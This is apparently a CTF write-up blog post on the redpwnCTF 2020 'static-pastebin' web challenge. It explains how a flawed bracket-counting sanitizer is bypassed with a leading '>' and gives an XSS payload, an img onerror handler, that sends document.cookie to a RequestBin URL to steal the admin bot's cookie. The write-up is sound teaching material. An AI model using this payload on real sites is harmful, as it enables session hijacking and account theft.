---
layout: post
title: redpwnCTF 2020 - static-pastebin
summary: An in-depth look at static-pastebin from redpwnCTF 2020. Huge thanks to redpwn for this awesome event!
date: 2020-06-25
author: Noxtal
categories: writeups
thumbnail:  redpwnctf
tags:
 - redpwnctf
 - web
 - javascript
 - cookie stealing
 - xss
 - requestbin
---

 An in-depth look at static-pastebin from redpwnCTF 2020. Huge thanks to **redpwn** for this awesome event!

-----

# Description
Web, 373 points</br>
Challenge author: BrownieInMotion

> I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it [here]("https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin")

*Note: if this challenge is not disponible at the time you read this writeup, I've made a similar challenge hosted on my domain. You can find it [here](https://challenges.noxtal.com/redbook).*

# Solution
When we open the challenge's website, we can see a pastebin-like website on which you can create a *paste* and "publish it to the internet". Actually, after analyzing the code a bit, we can find that the *paste*'s URL is only `/paste/#` appended with the paste itself encoded as base64.

We have only got a text input and a button that allows us to reflect what we have typed on another page. This is a perfect playground for XSS. If you don't know XSS yet, I really suggest you learn more about it, as it is a really common attack in real-life scenarios. You can learn more about it on my [learning platform](https://learn.noxtal.com).

Let's test this idea by trying to inject an h1 tag in the *paste*.

![h1 test](https://i.imgur.com/bIM7b3n.png)

Weirdly, it seems like the h1 tag wasn't reflected on the *paste*. That doesn't mean XSS is not possible, it only means that there may be a sanitizer implemented that we need to bypass. By looking at the source provided in Chrome's Developer Tools, we can find a JavaScript file named *script.js*.

```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

There is the sanitizer, the `clean()` function. As you can probably see, this function removes (or unless tries) to remove every string surrounded by brackets, thus HTML tags. 

## Sanitizer Bypass
We now need to bypass the sanitizer. Let's take a look at the code to figure out how to bypass it. The main loop loops over each character of the *paste*. Then comes the filters: there is a variable named `brackets` which keeps track of if the current character is in between brackets or not. If a less than bracket sign is encountered, this count goes up by 1. Else, if a greater than sign appears, the count goes down by 1. If the count is equal to 0, the current character is reflected on the *paste*. 

After a few bypass attempts, we can find that putting a greater than sign in front of the tag we want to inject, it will actually be reflected. This comes from the fact that this sign makes the count go down by 1, thus when the less than sign will be encountered the `brackets` variable is going to equal zero.

The only con with this technique is that we can only pass one tag, so no classic opening and closing tags. This is not really a problem when using *img* tags, as you will see later on.

## Cookie Stealing
In the challenge's description, we can see we are given an admin bot. The flag must be contained in that admin user. One of the main use of XSS is stealing cookies, meaning we may need to steal the admin bot's cookie. To steal cookies, we only need to inject a tag that requests a page we own with the cookies in the query and give that to the user we want to steal cookies from. This process can be done easily by the use of RequestBin.

RequestBin is a web application allowing you to create a special URL that logs every request made to it so you can analyze them. If we request a RequestBin URL and append `document.cookie` to it, we should get a request logged containing the cookie in the query logged. This is the final payload I came up with. It makes use of an image tag with the `src` parameter set to x and the `onerror` parameter to the JavaScript code we want to execute (in our case requesting the RequestBin link). The `src` parameter will create an error because it was set to an arbitrary value and will trigger the code specified in the `onerror` parameter.

```html
><img src=x onerror=this.src="REQUESTBIN_URL"+document.cookie/>
```

We finally need to put the payload in the paste and give the corresponding URL to the admin bot and we are done! The flag can be found as expected in the admin cookies.
![flag](https://i.imgur.com/JTGRrrh.png)

That's all we got to do to solve this challenge. RedpwnCTF was really fun, even if the challenges were harder than other CTFs I played. I enjoyed doing the web challenges. Huge thanks to **redpwn** for this awesome event. 

If this challenge is not disponible at the time you read this writeup, I've made a similar challenge hosted on my domain. You can find it [here](https://challenges.noxtal.com/redbook).

